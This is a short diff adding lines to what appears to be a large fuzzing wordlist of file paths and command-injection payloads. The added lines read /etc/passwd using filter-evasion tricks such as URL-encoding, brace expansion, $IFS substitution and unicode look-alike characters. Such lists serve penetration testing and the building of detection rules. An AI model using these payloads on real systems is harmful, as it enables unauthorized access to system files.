@@ -27206,6 +27206,12 @@ c:\php5\php.ini
 c:\php\php.ini
 c:\wamp\logs\access.log
 c:\xampp\apache\bin\php.ini
+cat</etc/passwd
+cat%3C/etc/passwd
+cat%3C%2fetc%2fpasswd
+{cat,/etc/passwd}
+cat$IFS/etc/passwd
+cat${IFS}/etc/passwd
 cat%20/etc/passwd
 cat%20/ℯ𝐓Ⓒ/𝐩?sswd
 cat%20/🄴🅃🄲/🅂?🄰🄳??
